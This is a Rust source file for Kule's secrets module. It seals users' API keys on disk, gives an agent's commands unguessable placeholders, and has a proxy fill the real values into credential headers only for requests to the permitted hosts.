//! Secrets: the API keys and passwords an agent's tools need, which the
//! agent itself never sees.
//!
//! A person keeps each secret in Kule's home (`secrets.json`, readable by
//! them alone, hidden from every sandbox) with the hosts it is for. A task's
//! commands get a placeholder in its place, in an environment variable of
//! the secret's name; the task's proxy puts the real value into a request
//! only on its way to one of those hosts, over TLS (see [`crate::tls`]).
//! Sent anywhere else, the placeholder is a string that opens nothing.
//!
//! The values in the copy's `.env` files that look like secrets are
//! replaced with placeholders the same way, and put back when a commit
//! takes such a file to the folder. A value that is also a kept secret
//! gets that secret's placeholder, and so reaches its hosts; any other only
//! keeps the agent (and the model behind it) from reading it.

use std::collections::{BTreeMap, BTreeSet};
use std::io::{Read, Write};
use std::os::unix::fs::OpenOptionsExt;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use base64::Engine;
use serde::{Deserialize, Serialize};

use crate::error::{Error, IoContext, Result};
use crate::fsops::read_json;
use crate::remembered::plain_host;
use crate::sealing::{KeyHome, Sealer};

pub const SECRETS_FILE: &str = "secrets.json";

/// What every placeholder starts with, so a person reading a request or a
/// file sees what it is.
const PLACEHOLDER_PREFIX: &str = "kule_secret_";

/// A kept secret, without its value: all that leaves Kule's home.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecretInfo {
    /// The environment variable a task's commands find its placeholder in.
    pub name: String,
    /// Where the value may go: requests to these hosts, over HTTPS.
    pub hosts: Vec<String>,
    /// The folder it is for; `None` for every folder.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<PathBuf>,
    pub added_unix: u64,
}

impl SecretInfo {
    pub fn holds_for(&self, workspace: &Path) -> bool {
        self.workspace.as_deref().is_none_or(|w| w == workspace)
    }
}

/// A kept secret with its value, as Kule holds it while it works.
#[derive(Debug, Clone)]
struct Stored {
    info: SecretInfo,
    value: String,
}

#[derive(Debug, Default)]
struct Store {
    secrets: Vec<Stored>,
}

/// `secrets.json` as it is on disk: each value sealed with the key, and
/// where the key is kept (see [`crate::sealing`]). A file from before
/// sealing holds the values themselves, sealed at the next read.
#[derive(Debug, Default, Serialize, Deserialize)]
struct OnDisk {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    key: Option<KeyHome>,
    #[serde(default)]
    secrets: Vec<DiskSecret>,
}

#[derive(Debug, Serialize, Deserialize)]
struct DiskSecret {
    #[serde(flatten)]
    info: SecretInfo,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    sealed: Option<String>,
    /// The value is sealed to what the entry says it is for (see
    /// [`bound`]); `false` only in a file from before that, bound at the
    /// next read. A value sealed bound never opens unbound.
    #[serde(default)]
    bound: bool,
    /// Only in a file from before sealing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    value: Option<String>,
}

/// What a secret's value is sealed to: its name, the hosts it goes to and
/// the folder it is for. A sealed value moved to another entry, or an
/// entry given other hosts or another folder, does not open.
fn bound(info: &SecretInfo) -> Result<Vec<u8>> {
    serde_json::to_vec(&("kule-secret/1", &info.name, &info.hosts, &info.workspace))
        .map_err(|e| Error::Invalid(format!("{}: {e}", info.name)))
}

fn read_disk(home: &Path) -> Result<OnDisk> {
    let path = home.join(SECRETS_FILE);
    if !path.is_file() {
        return Ok(OnDisk::default());
    }
    read_json(&path)
}

/// The kept secrets with their values, unsealed; values kept unsealed by
/// an older Kule are sealed on the way.
fn read_store(home: &Path) -> Result<Store> {
    let disk = read_disk(home)?;
    if disk.secrets.is_empty() {
        return Ok(Store::default());
    }
    // The key only for what is sealed: a file from before sealing needs
    // none to be read.
    let sealer = if disk.secrets.iter().any(|s| s.sealed.is_some()) {
        Some(Sealer::open(home, disk.key)?)
    } else {
        None
    };
    // Written again, sealed and bound, when anything was not.
    let mut rewrite = false;
    let secrets = disk
        .secrets
        .into_iter()
        .map(|s| {
            let value = match (s.sealed, s.value) {
                (Some(sealed), _) => {
                    let sealer = sealer.as_ref().expect("opened for what is sealed");
                    if s.bound {
                        sealer.unseal(&sealed, &bound(&s.info)?)?
                    } else {
                        rewrite = true;
                        sealer.unseal(&sealed, b"")?
                    }
                }
                (None, Some(value)) => {
                    rewrite = true;
                    value
                }
                (None, None) => {
                    return Err(Error::Invalid(format!(
                        "{}: kept without a value",
                        s.info.name
                    )));
                }
            };
            Ok(Stored {
                info: s.info,
                value,
            })
        })
        .collect::<Result<Vec<_>>>()?;
    let store = Store { secrets };
    if rewrite {
        write_store(home, &store)?;
    }
    Ok(store)
}

/// Writes `store` with every value sealed.
fn write_store(home: &Path, store: &Store) -> Result<()> {
    let kept = read_disk(home)?.key;
    let sealer = Sealer::open(home, kept)?;
    let disk = OnDisk {
        key: Some(sealer.home),
        secrets: store
            .secrets
            .iter()
            .map(|s| {
                Ok(DiskSecret {
                    sealed: Some(sealer.seal(&s.value, &bound(&s.info)?)?),
                    bound: true,
                    info: s.info.clone(),
                    value: None,
                })
            })
            .collect::<Result<_>>()?,
    };
    write_private(&home.join(SECRETS_FILE), &disk)
}

/// Where the key to the secrets in `home` is kept; `None` before the first
/// secret is kept.
pub fn secrets_key_home(home: &Path) -> Result<Option<KeyHome>> {
    Ok(read_disk(home)?.key)
}

/// Writes `value` as JSON readable by its owner alone, replacing what was
/// there at once.
pub(crate) fn write_private<T: Serialize>(path: &Path, value: &T) -> Result<()> {
    let text = serde_json::to_vec_pretty(value).map_err(|source| Error::State {
        path: path.to_path_buf(),
        source,
    })?;
    let tmp = path.with_extension(format!("tmp-{}", std::process::id()));
    let _ = std::fs::remove_file(&tmp);
    std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&tmp)
        .and_then(|mut f| f.write_all(&text).and_then(|()| f.sync_all()))
        .at(&tmp)?;
    std::fs::rename(&tmp, path).at(path)
}

/// Keeps `value` as secret `name` for `hosts`, on `workspace` or every
/// folder; replaces the one of that name kept there before.
pub fn add_secret(
    home: &Path,
    name: &str,
    value: &str,
    hosts: &[String],
    workspace: Option<&Path>,
) -> Result<SecretInfo> {
    check_name(name)?;
    check_value(name, value)?;
    if hosts.is_empty() {
        return Err(Error::Invalid(format!(
            "{name}: a secret needs the hosts it is for"
        )));
    }
    for host in hosts {
        if !plain_host(host) {
            return Err(Error::Invalid(format!(
                "{host}: a lowercase host name, without a wildcard or a port"
            )));
        }
    }
    let workspace = match workspace {
        Some(w) => Some(std::fs::canonicalize(w).at(w)?),
        None => None,
    };
    std::fs::create_dir_all(home).at(home)?;
    let mut store = read_store(home)?;
    store
        .secrets
        .retain(|s| !(s.info.name == name && s.info.workspace == workspace));
    let mut hosts = hosts.to_vec();
    hosts.sort();
    hosts.dedup();
    let info = SecretInfo {
        name: name.to_owned(),
        hosts,
        workspace,
        added_unix: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map_or(0, |d| d.as_secs()),
    };
    store.secrets.push(Stored {
        info: info.clone(),
        value: value.to_owned(),
    });
    write_store(home, &store)?;
    Ok(info)
}

/// Forgets secret `name` kept for `workspace` (or every folder); whether
/// there was one.
pub fn remove_secret(home: &Path, name: &str, workspace: Option<&Path>) -> Result<bool> {
    let workspace = workspace.map(|w| std::fs::canonicalize(w).unwrap_or_else(|_| w.to_owned()));
    let mut store = read_store(home)?;
    let before = store.secrets.len();
    store
        .secrets
        .retain(|s| !(s.info.name == name && s.info.workspace == workspace));
    let gone = store.secrets.len() != before;
    if gone {
        write_store(home, &store)?;
    }
    Ok(gone)
}

/// Every kept secret, without its value.
pub fn secrets(home: &Path) -> Result<Vec<SecretInfo>> {
    // Names and hosts alone: the values stay sealed.
    Ok(read_disk(home)?
        .secrets
        .into_iter()
        .map(|s| s.info)
        .collect())
}

/// An environment variable's name: what a task's commands look the secret
/// up by.
fn check_name(name: &str) -> Result<()> {
    let ok = !name.is_empty()
        && name.len() <= 64
        && name.starts_with(|c: char| c.is_ascii_uppercase() || c == '_')
        && name
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
    if ok {
        Ok(())
    } else {
        Err(Error::Invalid(format!(
            "{name}: a secret's name is an environment variable's, like STRIPE_KEY"
        )))
    }
}

/// What can go into a request header as it is; refused naming `name` and
/// what is wrong, never the value.
fn check_value(name: &str, value: &str) -> Result<()> {
    let wrong = if value.is_empty() {
        "it is empty".to_owned()
    } else if value.len() > 16 * 1024 {
        format!("it is {} bytes", value.len())
    } else if value.chars().any(|c| c.is_control()) {
        // Pasting into a terminal can add escape sequences or a line end.
        "it holds a control character, such as an escape or a line end a terminal added when it was pasted".to_owned()
    } else {
        return Ok(());
    };
    Err(Error::Invalid(format!(
        "{name}: a secret's value is one line of text, up to 16 KiB; {wrong}"
    )))
}

/// A placeholder no one can guess: what a task's commands see instead of a
/// secret.
fn new_placeholder() -> Result<String> {
    let path = Path::new("/dev/urandom");
    let mut bytes = [0u8; 16];
    std::fs::File::open(path)
        .and_then(|mut f| f.read_exact(&mut bytes))
        .at(path)?;
    let hex: String = bytes.iter().map(|b| format!("{b:02x}")).collect();
    Ok(format!("{PLACEHOLDER_PREFIX}{hex}"))
}

/// A task's placeholders, kept in the task's directory (outside the copy,
/// hidden from the sandbox) so they stay the same from run to run, with
/// the values masked in its copy sealed with the key to the secrets (see
/// [`TaskDisk`]).
#[derive(Debug, Default)]
pub(crate) struct TaskSecrets {
    /// Kept secret name → its placeholder in this task.
    pub placeholders: BTreeMap<String, String>,
    /// The values masked in the copy, by placeholder.
    pub masked: BTreeMap<String, Masked>,
    /// Every other setting a placeholder took the place of: a kept
    /// secret's in a second file, say. A placeholder goes back to a value
    /// only where it was put (see [`Vault::unmask`]).
    pub also: Vec<Place>,
}

/// One setting a placeholder took the place of.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub(crate) struct Place {
    pub placeholder: String,
    #[serde(flatten)]
    pub masked: Masked,
}

/// A value Kule took out of a file in the copy.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub(crate) struct Masked {
    pub path: String,
    /// The setting it was the value of; empty for a line.
    pub key: String,
    /// The value, or the whole line as the file had it.
    pub value: String,
    /// For a line a kept secret was in (see [`mask_lines`]): the line as
    /// Kule masked it, which alone goes back to `value`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<String>,
}

/// A task's `secrets.json` as it is on disk: each masked value sealed with
/// the key to the secrets of Kule's home, to the setting it was taken from
/// (see [`task_bound`]), and which key that is. A file from before sealing
/// holds the values themselves, sealed at the next read.
#[derive(Debug, Default, Serialize, Deserialize)]
struct TaskDisk {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    key: Option<KeyHome>,
    #[serde(default)]
    placeholders: BTreeMap<String, String>,
    #[serde(default)]
    masked: BTreeMap<String, DiskMasked>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    also: Vec<DiskPlace>,
}

#[derive(Debug, Serialize, Deserialize)]
struct DiskMasked {
    path: String,
    key: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    line: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    sealed: Option<String>,
    /// Only in a file from before sealing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    value: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct DiskPlace {
    placeholder: String,
    #[serde(flatten)]
    masked: DiskMasked,
}

/// What a masked value is sealed to: its placeholder and the setting it
/// was taken from, or the line as Kule masked it. A sealed value moved to
/// another entry does not open.
fn task_bound(placeholder: &str, path: &str, key: &str, line: Option<&str>) -> Result<Vec<u8>> {
    match line {
        None => serde_json::to_vec(&("kule-task-secret/1", placeholder, path, key)),
        Some(line) => serde_json::to_vec(&("kule-task-line/1", placeholder, path, line)),
    }
    .map_err(|e| Error::Invalid(format!("{path}: {e}")))
}

impl TaskSecrets {
    /// The task's in `dir`, its values opened with the key to the secrets
    /// of Kule's `home`; values kept unsealed by an older Kule are sealed
    /// on the way.
    pub fn load(dir: &Path, home: &Path) -> Result<TaskSecrets> {
        let path = dir.join(SECRETS_FILE);
        if !path.is_file() {
            return Ok(TaskSecrets::default());
        }
        let disk: TaskDisk = read_json(&path)?;
        let sealed = disk
            .masked
            .values()
            .chain(disk.also.iter().map(|p| &p.masked))
            .any(|m| m.sealed.is_some());
        let sealer = if sealed {
            Some(Sealer::open(home, disk.key.or(read_disk(home)?.key))?)
        } else {
            None
        };
        let mut rewrite = false;
        let mut open = |placeholder: &str, m: DiskMasked| -> Result<Masked> {
            let value = match (m.sealed, m.value) {
                (Some(sealed), _) => sealer.as_ref().expect("opened for what is sealed").unseal(
                    &sealed,
                    &task_bound(placeholder, &m.path, &m.key, m.line.as_deref())?,
                )?,
                (None, Some(value)) => {
                    rewrite = true;
                    value
                }
                (None, None) => {
                    return Err(Error::Invalid(format!("{}: kept without a value", m.path)));
                }
            };
            Ok(Masked {
                path: m.path,
                key: m.key,
                value,
                line: m.line,
            })
        };
        let masked = disk
            .masked
            .into_iter()
            .map(|(p, m)| Ok((p.clone(), open(&p, m)?)))
            .collect::<Result<_>>()?;
        let also = disk
            .also
            .into_iter()
            .map(|p| {
                Ok(Place {
                    masked: open(&p.placeholder, p.masked)?,
                    placeholder: p.placeholder,
                })
            })
            .collect::<Result<_>>()?;
        let task = TaskSecrets {
            placeholders: disk.placeholders,
            masked,
            also,
        };
        if rewrite {
            task.save(dir, home)?;
        }
        Ok(task)
    }

    /// Writes the task's to `dir`, every value sealed with the key to the
    /// secrets of Kule's `home`.
    pub fn save(&self, dir: &Path, home: &Path) -> Result<()> {
        let path = dir.join(SECRETS_FILE);
        let values = !self.masked.is_empty() || !self.also.is_empty();
        // The key only for values: placeholders alone are no secret.
        let sealer = if values {
            let kept = match path.is_file() {
                true => read_json::<TaskDisk>(&path)?.key,
                false => None,
            };
            Some(Sealer::open(home, kept.or(read_disk(home)?.key))?)
        } else {
            None
        };
        let seal = |placeholder: &str, m: &Masked| -> Result<DiskMasked> {
            let sealer = sealer.as_ref().expect("opened for the values");
            let bound = task_bound(placeholder, &m.path, &m.key, m.line.as_deref())?;
            Ok(DiskMasked {
                sealed: Some(sealer.seal(&m.value, &bound)?),
                path: m.path.clone(),
                key: m.key.clone(),
                line: m.line.clone(),
                value: None,
            })
        };
        let disk = TaskDisk {
            key: sealer.as_ref().map(|s| s.home),
            placeholders: self.placeholders.clone(),
            masked: self
                .masked
                .iter()
                .map(|(p, m)| Ok((p.clone(), seal(p, m)?)))
                .collect::<Result<_>>()?,
            also: self
                .also
                .iter()
                .map(|p| {
                    Ok(DiskPlace {
                        placeholder: p.placeholder.clone(),
                        masked: seal(&p.placeholder, &p.masked)?,
                    })
                })
                .collect::<Result<_>>()?,
        };
        write_private(&path, &disk)
    }

    fn placeholder_of(&mut self, name: &str) -> Result<String> {
        if let Some(p) = self.placeholders.get(name) {
            return Ok(p.clone());
        }
        let p = new_placeholder()?;
        self.placeholders.insert(name.to_owned(), p.clone());
        Ok(p)
    }
}

/// One secret a task's proxy holds.
#[derive(Debug, Clone)]
struct Held {
    name: String,
    placeholder: String,
    value: String,
    hosts: Vec<String>,
    /// Given to commands as an environment variable of its name.
    env: bool,
    /// A secret the person keeps (for this folder or another) or an
    /// agent's key: masked wherever it is in a settings file.
    kept: bool,
}

/// An agent's API key from the person's environment, which the agent never
/// sees: it gets a placeholder of this run, and the task's proxy puts the
/// key into requests to `hosts` alone.
#[derive(Clone, PartialEq, Eq)]
pub struct AgentKey {
    /// The variable the agent reads it from.
    pub name: String,
    pub value: String,
    pub hosts: Vec<String>,
}

impl std::fmt::Debug for AgentKey {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("AgentKey")
            .field("name", &self.name)
            .field("hosts", &self.hosts)
            .finish_non_exhaustive()
    }
}

/// What a task's proxy holds: every placeholder of the task with its value,
/// and where each may go.
#[derive(Debug, Clone, Default)]
pub struct Vault {
    held: Vec<Held>,
    /// Where each placeholder took a setting's place, with the value as
    /// the file had it.
    places: Vec<Place>,
}

impl Vault {
    /// Holds an agent's `keys` too, each under a placeholder of its own for
    /// this run. A kept secret of the same name wins: the person said where
    /// that one goes.
    pub(crate) fn with_keys(&mut self, keys: &[AgentKey]) -> Result<()> {
        for key in keys {
            check_name(&key.name)?;
            check_value(&key.name, &key.value)?;
            if let Some(host) = key.hosts.iter().find(|h| !plain_host(h)) {
                return Err(Error::Invalid(format!(
                    "{}: {host:?} is not a host name",
                    key.name
                )));
            }
            if self.held.iter().any(|h| h.env && h.name == key.name) {
                continue;
            }
            self.held.push(Held {
                name: key.name.clone(),
                placeholder: new_placeholder()?,
                value: key.value.clone(),
                hosts: key.hosts.clone(),
                env: true,
                kept: true,
            });
        }
        Ok(())
    }

    /// The secrets kept in `home` for `workspace`, and the values masked in
    /// the task's copy, with the placeholders of the task in `dir`.
    pub(crate) fn load(home: &Path, workspace: &Path, dir: &Path) -> Result<Vault> {
        let store = read_store(home)?;
        let mut task = TaskSecrets::load(dir, home)?;
        let before = task.placeholders.len();
        let mut held = Vec::new();
        // Kept for this folder before kept for every folder, so the narrower
        // one wins a name both have.
        let mut kept: Vec<&Stored> = store
            .secrets
            .iter()
            .filter(|s| s.info.holds_for(workspace))
            .collect();
        kept.sort_by_key(|s| s.info.workspace.is_none());
        for s in kept {
            if held.iter().any(|h: &Held| h.name == s.info.name) {
                continue;
            }
            held.push(Held {
                name: s.info.name.clone(),
                placeholder: task.placeholder_of(&s.info.name)?,
                value: s.value.clone(),
                hosts: s.info.hosts.clone(),
                env: true,
                kept: true,
            });
        }
        // Kept for other folders: no host is given them here, but they are
        // masked as well, as the home is the same for every folder.
        for s in store
            .secrets
            .iter()
            .filter(|s| !s.info.holds_for(workspace))
        {
            if held.iter().any(|h| h.value == s.value) {
                continue;
            }
            held.push(Held {
                name: s.info.name.clone(),
                placeholder: new_placeholder()?,
                value: s.value.clone(),
                hosts: Vec::new(),
                env: false,
                kept: true,
            });
        }
        if task.placeholders.len() != before {
            task.save(dir, home)?;
        }
        for (placeholder, m) in &task.masked {
            // A masked value has no hosts of its own; it goes where a kept
            // secret holding the same value goes.
            let hosts = held
                .iter()
                .find(|h| h.env && h.value == m.value)
                .map(|h| h.hosts.clone())
                .unwrap_or_default();
            held.push(Held {
                name: format!("{}:{}", m.path, m.key),
                placeholder: placeholder.clone(),
                value: m.value.clone(),
                hosts,
                env: false,
                kept: false,
            });
        }
        let places = task
            .masked
            .into_iter()
            .map(|(placeholder, masked)| Place {
                placeholder,
                masked,
            })
            .chain(task.also)
            .collect();
        Ok(Vault { held, places })
    }

    /// The environment a task's commands get: each kept secret's name with
    /// its placeholder.
    pub fn env(&self) -> Vec<(String, String)> {
        self.held
            .iter()
            .filter(|h| h.env)
            .map(|h| (h.name.clone(), h.placeholder.clone()))
            .collect()
    }

    /// Every host some secret may go to.
    pub fn hosts(&self) -> BTreeSet<String> {
        self.held.iter().flat_map(|h| h.hosts.clone()).collect()
    }

    /// The placeholder kept secret `name` has, if any.
    pub(crate) fn placeholder_for_value(&self, value: &str) -> Option<&str> {
        self.held
            .iter()
            .find(|h| h.env && h.value == value)
            .map(|h| h.placeholder.as_str())
    }

    /// `head` (a request line and its headers) bound for `host`, with the
    /// placeholders of the secrets that may go there put back to their
    /// values in its credential headers alone (see [`CREDENTIAL_HEADERS`]),
    /// also inside `Authorization: Basic`; and the names of the secrets
    /// that went in. Anywhere else (the URL, another header, the body) a
    /// placeholder stays one: a value there could reach what repeats it
    /// back, a model given it in a prompt, say.
    pub fn fill(&self, host: &str, head: &str) -> (String, Vec<String>) {
        let going = self.going_to(host);
        let mut used = BTreeSet::new();
        let mut out = String::with_capacity(head.len());
        for (i, line) in head.split_inclusive('\n').enumerate() {
            if i == 0 || !is_credential(line) {
                out.push_str(line);
                continue;
            }
            let basic = line
                .split_once(':')
                .filter(|(name, _)| name.trim().eq_ignore_ascii_case("authorization"))
                .and_then(|(name, value)| {
                    let value = value.trim();
                    let encoded = value
                        .strip_prefix("Basic ")
                        .or_else(|| value.strip_prefix("basic "))?;
                    let decoded = base64::engine::general_purpose::STANDARD
                        .decode(encoded.trim())
                        .ok()?;
                    let decoded = String::from_utf8(decoded).ok()?;
                    let (filled, names) = replace_all(&going, &decoded);
                    if names.is_empty() {
                        return None;
                    }
                    used.extend(names);
                    let end = if line.ends_with("\r\n") { "\r\n" } else { "\n" };
                    Some(format!(
                        "{name}: Basic {}{end}",
                        base64::engine::general_purpose::STANDARD.encode(filled)
                    ))
                });
            match basic {
                Some(rewritten) => out.push_str(&rewritten),
                None => {
                    let (filled, names) = replace_all(&going, line);
                    used.extend(names);
                    out.push_str(&filled);
                }
            }
        }
        (out, used.into_iter().collect())
    }

    fn going_to(&self, host: &str) -> Vec<&Held> {
        self.held
            .iter()
            .filter(|h| h.hosts.iter().any(|h| h == host))
            .collect()
    }

    /// The credential header of `head`, bound for `host`, that holds none of
    /// the placeholders of the secrets kept for `host`: credentials Kule
    /// does not hold, an account that is not the person's. `None` when every
    /// credential is Kule's, or Kule holds nothing for `host`.
    pub(crate) fn foreign_credential(&self, host: &str, head: &str) -> Option<String> {
        let going = self.going_to(host);
        if going.is_empty() {
            return None;
        }
        // Exactly one of Kule's placeholders: nothing of anyone else's
        // beside it.
        let ours = |said: &str| going.iter().any(|h| said == h.placeholder);
        // A key in the address (Google's `?key=`) is as much a credential,
        // however its name is written.
        let target = head.lines().next()?.split(' ').nth(1).unwrap_or_default();
        let query = target.split_once('?').map_or("", |(_, q)| q);
        let in_query = query.split('&').find_map(|pair| {
            let (name, value) = pair.split_once('=').unwrap_or((pair, ""));
            let name = percent_decoded(name);
            let credential = CREDENTIAL_PARAMS
                .iter()
                .any(|c| name.eq_ignore_ascii_case(c));
            (credential && !ours(&percent_decoded(value))).then(|| format!("?{name}="))
        });
        if in_query.is_some() {
            return in_query;
        }
        head.split_inclusive('\n').skip(1).find_map(|line| {
            let (name, value) = line.split_once(':')?;
            let (name, value) = (name.trim(), value.trim());
            // Cookies carry sessions: someone else's account, as much
            // as a key.
            if name.eq_ignore_ascii_case("cookie") {
                return Some(name.to_owned());
            }
            if !is_credential(line) {
                return None;
            }
            // `<placeholder>`, or one scheme word before it; with Basic,
            // one side of `user:password`.
            let scheme_and_rest = value.split_once(' ');
            let basic = scheme_and_rest
                .filter(|(scheme, _)| scheme.eq_ignore_ascii_case("basic"))
                .and_then(|(_, v)| {
                    base64::engine::general_purpose::STANDARD
                        .decode(v.trim())
                        .ok()
                })
                .and_then(|d| String::from_utf8(d).ok());
            let fine = match (&basic, scheme_and_rest) {
                (Some(pair), _) => pair
                    .split_once(':')
                    .is_some_and(|(user, password)| ours(user) || ours(password)),
                (None, Some((_, rest))) => ours(rest.trim()),
                (None, None) => ours(value),
            };
            (!fine).then(|| name.to_owned())
        })
    }

    /// Whether Kule keeps credentials for `host`, which only Kule's then
    /// reach.
    pub(crate) fn holds_for(&self, host: &str) -> bool {
        !self.going_to(host).is_empty()
    }

    /// The credential field of a form `body` (`application/x-www-form-
    /// urlencoded`) bound for `host` that is none of Kule's placeholders:
    /// as [`Vault::foreign_credential`] for a form's fields. `None` when it
    /// has none, or Kule holds nothing for `host`.
    pub(crate) fn foreign_in_form(&self, host: &str, body: &[u8]) -> Option<String> {
        let going = self.going_to(host);
        if going.is_empty() {
            return None;
        }
        let text = String::from_utf8_lossy(body);
        text.split('&').find_map(|pair| {
            let (name, value) = pair.split_once('=').unwrap_or((pair, ""));
            let decoded = |s: &str| percent_decoded(&s.replace('+', " "));
            let (name, value) = (decoded(name), decoded(value));
            let credential = CREDENTIAL_PARAMS
                .iter()
                .chain(FORM_CREDENTIALS)
                .any(|c| name.trim().eq_ignore_ascii_case(c));
            let ours = going.iter().any(|h| value == h.placeholder);
            (credential && !ours).then(|| format!("form field {}", name.trim()))
        })
    }

    /// Each kept secret's value as it is, and as it reads in JSON and in a
    /// URL, with its placeholder; the longest first, so a value inside
    /// another is not masked by half.
    fn kept_forms(&self) -> Vec<(String, &str)> {
        let mut forms: Vec<(String, &str)> = Vec::new();
        for h in self.held.iter().filter(|h| h.kept) {
            for encoding in [Encoding::Raw, Encoding::Json, Encoding::Url] {
                let mut form = Vec::new();
                encoding.write(&h.value, &mut form);
                let form = String::from_utf8_lossy(&form).into_owned();
                if !form.is_empty() && !forms.iter().any(|(f, _)| *f == form) {
                    forms.push((form, &h.placeholder));
                }
            }
        }
        forms.sort_by_key(|(f, _)| std::cmp::Reverse(f.len()));
        forms
    }

    /// Every real value the vault holds, as it is and as it reads in JSON
    /// and in a URL: the forms a response that repeats it may hold.
    pub(crate) fn values(&self) -> Vec<String> {
        let mut forms = BTreeSet::new();
        for h in &self.held {
            for encoding in [Encoding::Raw, Encoding::Json, Encoding::Url] {
                let mut form = Vec::new();
                encoding.write(&h.value, &mut form);
                forms.insert(String::from_utf8_lossy(&form).into_owned());
            }
        }
        forms.into_iter().collect()
    }

    /// `text`, the settings file at `path`, with each placeholder put back
    /// to its value where Kule put it: in this file, as the value of the
    /// same setting, or in a line just as Kule masked it, no more times
    /// than the file held that line. A placeholder anywhere else stays one,
    /// so what the agent writes cannot have a commit put a secret where it
    /// chose.
    pub(crate) fn unmask(&self, path: &str, text: &str) -> String {
        // The lines first: they were masked after the settings.
        let lines: Vec<&Masked> = self
            .places
            .iter()
            .map(|p| &p.masked)
            .filter(|m| m.path == path && m.line.is_some())
            .collect();
        let mut used = vec![false; lines.len()];
        let mut out = String::with_capacity(text.len());
        for line in text.split_inclusive('\n') {
            let body = line.trim_end_matches(['\n', '\r']);
            let found =
                (0..lines.len()).find(|&i| !used[i] && lines[i].line.as_deref() == Some(body));
            match found {
                Some(i) => {
                    used[i] = true;
                    out.push_str(&lines[i].value);
                    out.push_str(&line[body.len()..]);
                }
                None => out.push_str(line),
            }
        }
        mask_env(&out, |key, value| {
            Ok(self
                .places
                .iter()
                .find(|p| p.placeholder == value && p.masked.path == path && p.masked.key == key)
                .map(|p| p.masked.value.clone()))
        })
        .unwrap_or(out)
    }
}

/// The headers that carry credentials, where a secret is filled in, and
/// where any other value is someone else's credentials.
pub const CREDENTIAL_HEADERS: &[&str] = &[
    "authorization",
    "x-api-key",
    "x-goog-api-key",
    "api-key",
    "x-auth-token",
    "private-token",
];

/// `text` with its `%XX` escapes read; one that is not an escape stays.
fn percent_decoded(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        let hex = bytes
            .get(i + 1..i + 3)
            .and_then(|h| std::str::from_utf8(h).ok())
            .and_then(|h| u8::from_str_radix(h, 16).ok());
        match (bytes[i], hex) {
            (b'%', Some(b)) => {
                out.push(b);
                i += 3;
            }
            (b'+', _) => {
                out.push(b' ');
                i += 1;
            }
            (b, _) => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Query parameters that carry credentials, on a host Kule holds a secret
/// for.
const CREDENTIAL_PARAMS: &[&str] = &["key", "api_key", "apikey", "access_token", "token"];

/// What else a form carries credentials in: OAuth's token requests.
const FORM_CREDENTIALS: &[&str] = &["client_secret", "refresh_token"];

fn is_credential(line: &str) -> bool {
    line.split_once(':').is_some_and(|(name, _)| {
        let name = name.trim();
        CREDENTIAL_HEADERS
            .iter()
            .any(|c| name.eq_ignore_ascii_case(c))
    })
}

fn replace_all(held: &[&Held], text: &str) -> (String, Vec<String>) {
    let (out, used) = replace_bytes(held, text.as_bytes(), Encoding::Raw);
    // Placeholders and values are both text, so text stays text.
    (
        String::from_utf8(out).unwrap_or_else(|_| text.to_owned()),
        used,
    )
}

/// How a value is written where its placeholder was, so it means there
/// what it means as it is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Encoding {
    Raw,
    /// In a URL or a form: every byte but letters, digits and `-._~`
    /// percent-encoded (a `+` would read as a space).
    Url,
    /// In a JSON string: `"` and `\` escaped.
    Json,
}

impl Encoding {
    fn write(self, value: &str, out: &mut Vec<u8>) {
        match self {
            Encoding::Raw => out.extend_from_slice(value.as_bytes()),
            Encoding::Url => {
                for &b in value.as_bytes() {
                    if b.is_ascii_alphanumeric() || b"-._~".contains(&b) {
                        out.push(b);
                    } else {
                        out.extend_from_slice(format!("%{b:02X}").as_bytes());
                    }
                }
            }
            Encoding::Json => {
                for &b in value.as_bytes() {
                    if b == b'"' || b == b'\\' {
                        out.push(b'\\');
                    }
                    out.push(b);
                }
            }
        }
    }
}

/// `data` with each placeholder of `held` put back to its value, written
/// as `encoding` says; and the names of the secrets that went in.
fn replace_bytes(held: &[&Held], data: &[u8], encoding: Encoding) -> (Vec<u8>, Vec<String>) {
    let prefix = PLACEHOLDER_PREFIX.as_bytes();
    let mut used = BTreeSet::new();
    if !data.windows(prefix.len()).any(|w| w == prefix) {
        return (data.to_vec(), Vec::new());
    }
    let mut out = Vec::with_capacity(data.len());
    let mut at = 0;
    'scan: while at < data.len() {
        if data[at..].starts_with(prefix) {
            for h in held {
                if data[at..].starts_with(h.placeholder.as_bytes()) {
                    encoding.write(&h.value, &mut out);
                    used.insert(h.name.clone());
                    at += h.placeholder.len();
                    continue 'scan;
                }
            }
        }
        out.push(data[at]);
        at += 1;
    }
    (out, used.into_iter().collect())
}

/// Whether the file at `path` (relative) holds settings like `KEY=value`
/// that Kule masks: `.env`, `.env.local`, `production.env`, `.envrc`; not
/// the examples meant to be shared.
pub(crate) fn is_env_file(path: &str) -> bool {
    let name = path.rsplit('/').next().unwrap_or(path);
    let shared = [".example", ".sample", ".template", ".dist", ".defaults"]
        .iter()
        .any(|s| name.ends_with(s));
    !shared
        && (name == ".env"
            || name == ".envrc"
            || name.starts_with(".env.")
            || name.ends_with(".env"))
}

